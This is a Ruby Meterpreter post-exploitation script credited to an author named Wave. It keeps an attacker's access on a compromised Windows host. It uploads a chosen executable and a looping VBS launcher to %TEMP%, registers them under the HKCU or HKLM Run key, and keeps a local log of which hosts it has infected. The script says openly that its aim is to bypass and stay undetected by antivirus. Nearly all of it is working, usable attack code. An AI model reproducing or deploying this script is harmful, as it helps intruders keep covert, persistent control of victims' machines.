# Author: Wave
print_status("Hello World")
print_status("This script will add a persistent custom payload on the host, allowing you to bypass AVs !")
#setting up default needed var
nam = Rex::Text.rand_text_alpha(rand(8)+8)
auto = 0
refresh = "3600000"
already = 0
exe = "/root/persistence.exe"
exeonly = 0
customvbs = 0
uploadvbs = 0
customvbs_location = "indefinie"
key = "HKCU"
@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "This help menu"],
  "-f"  => [ true,   "The exe file to use for persistence"],
"-i"  => [ false,   "Dont persist if there is already a log of a persistence on this host"],
"-d"  => [ true,   "delay between each connection attemp"],
"-n"  => [ true,   "custom name to use"],
"-v" => [ true,   "use a cutom vbs script"],
"-e" => [ false,   "set exe only as persistence"],
"-s" => [ false,   "install as system user (HKLM instead HKCU)"],
)
meter_type = client.platform

################## Function Declarations ##################

# Usage Message Function
#-------------------------------------------------------------------------------
def usage
  print_line "Meterpreter Script to create a Persistence on the remote host using custom exe and vbs to stay undetected by AV."
  print_line(@exec_opts.usage)
  raise Rex::Script::Completed
end

#########persistence#############
def persistement(nam,exe,key)
location = session.sys.config.getenv('TEMP')
keyvaluevbs = "\"#{location}\\#{nam}.vbs\""
vbs = "#{location}\\#{nam}.vbs"
print_status("#{location}")

#installing persistence in registry
  key_path = "#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  print_status("Installing into autorun as #{key_path}\\#{nam}")
    registry_setvaldata("#{key_path}", nam, keyvaluevbs, "REG_SZ")
print_status("work done")
####done###

#uploading needed files
        fileexe = "#{location}\\#{nam}.exe" 
      print_status("\tUploading exe...")
      session.fs.file.upload_file("#{fileexe}","#{exe}")
      print_good("\tpersistence.exe uploaded!")
      print_status("\tUploaded as #{fileexe}")
end
####done###

#########exeonly optiion selected#############
def exeonly(nam,exe,key)
location = session.sys.config.getenv('TEMP')
keyvaluevbs = "\"#{location}\\#{nam}.exe\""
vbs = "#{location}\\#{nam}.exe"
print_status("#{location}")

#installing persistence in registry
  key_path = "#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  print_status("Installing into autorun as #{key_path}\\#{nam}")
    registry_setvaldata("#{key_path}", nam, keyvaluevbs, "REG_SZ")
print_status("work done")
####done##

#uploading needed files
        fileexe = "#{location}\\#{nam}.exe" 
      print_status("\tUploading exe...")
      session.fs.file.upload_file("#{fileexe}","#{exe}")
      print_good("\tpersistence.exe uploaded!")
      print_status("\tUploaded as #{fileexe}")
end

####done###


#########cutomvbs#############
def customvbs(nam,customvbs_location,exe,key)
location = session.sys.config.getenv('TEMP')
keyvaluevbs = "\"#{location}\\#{nam}.vbs\""
vbs = "#{location}\\#{nam}.vbs"
print_status("#{location}")

#installing persistence in registry
  key_path = "#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  print_status("Installing into autorun as #{key_path}\\#{nam}")
    registry_setvaldata("#{key_path}", nam, keyvaluevbs, "REG_SZ")
print_status("work done")
####done###

#uploading exe files
        fileexe = "#{location}\\#{nam}.exe" 
      print_status("\tUploading exe...")
      session.fs.file.upload_file("#{fileexe}","#{exe}")
      print_good("\tpersistence.exe uploaded!")
      print_status("\tUploaded as #{fileexe}")
#uploading vbs files
	 filevbs = "#{location}\\#{nam}.vbs" 
      print_status("\tUploading vbs...")
      session.fs.file.upload_file("#{filevbs}","#{customvbs_location}")
      print_good("\t.vbs persistence uploaded!")
      print_status("\tUploaded as #{filevbs}")

####done###
end
###############Create persistent script}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
#-------------------------------------------------------------------------------
def create_script(refresh,nam)
print_status("creating vbs script for autorun...")
print_status("delay of #{refresh} ms")
      vbs = "Set WshShell = WScript.CreateObject(\"WScript.Shell\")
do
WshShell.Run (\"%TEMP%/#{nam}.exe\")
WScript.Sleep #{refresh}
Loop"
return vbs
print_good("script created!")
end

# {{{{{{{{{{{{{{{{{{{{Writte vbs script on host}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
#-------------------------------------------------------------------------------
def write_script_to_target(nam,vbs)
print_status("Writting script on host...")
location = session.sys.config.getenv('TEMP')
tempvbs = "#{location}\\#{nam}.vbs"
  fd = @client.fs.file.new(tempvbs, "wb")
  fd.write(vbs)
  fd.close
  print_good("Persistent Script written to #{tempvbs}")
end
#######FUNCTION TO CHECK PREVIOUS LOG FILES#######
def log_check(auto)
if auto == 1
  #Get hostname
  host = @client.sys.config.sysinfo["Computer"]

  logs = ::File.join(Msf::Config.log_directory, 'persistement',
                       Rex::FileUtils.clean_path(host) )


  testlogfile = "#{logs}#{host}.txt"
  if ::File.exist?(testlogfile)
print_error("host already Persistemented!")
    raise "Humm... Host already persistemented, -i option selected. Stopping there."
already = 1
end

else
already = 0
end
print_error("Logs file for this host is #{testlogfile}")
return already
end

########FUNCTION TO CREATE LOGFILE###############
def log_file
  #Get hostname
  host = @client.sys.config.sysinfo["Computer"]

  logs = ::File.join(Msf::Config.log_directory, 'persistement',
                       Rex::FileUtils.clean_path(host) )


  ::FileUtils.mkdir_p(logs)

  logfile = "#{logs}#{host}.txt"

file_local_write(logfile, "This host has been Persistemented ! Maybe u wont persist another time, do u ?")
  return logfile
print_status("logs are stored in #{logs}")
print_status("log for this host is #{logfile}")
end

################## Main ##################

#"-h"  => [ false,  "This help menu"],
#"-f"  => [ true,   "The exe file to use for persistence"],
#"-i"  => [ false,   "dont persist if a persistence log for this computer exist"],
#"-d"  => [ false,   "delay between each connection attemp"],
#"-n"  => [ true,   "custom name to use"],
#"-v" => [ true,   "use a cutom vbs script"],
#"-e" => [ false,   "set exe only as persistence"],


@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    usage
  when "-f"
    exe = val
  when "-i"
    auto = 1
  when "-d"
    refresh = val
print_status("delay of #{refresh}ms selected")
  when "-n"
    nam = val
  when "-v"
customvbs_location = val
    customvbs = 1
  when "-s"
key = "HKLM"
	
when "-e"
exeonly = 1
end
}

log_check(auto)
if already == 0
if exeonly == 0
#create vbs
if customvbs == 0
vbs = create_script(refresh,nam)
print_line = "#{vbs}"
#upload exe & Install in registry
persistement(nam,exe,key)
#send vbs
write_script_to_target(nam,vbs)
else
print_status("#{customvbs_location} selected")
print_error("delay will be ignored")
###upload both exe and vbs########
customvbs(nam,customvbs_location,exe,key)
end
end
if exeonly == 1
exeonly(nam,exe,key)
end
#create log file
log_file
#prompt nice message
print_status("Noraj de mon persistage ;\)")
end
if already == 1
print_error("host already Persistemented!")
end
print_error("END")

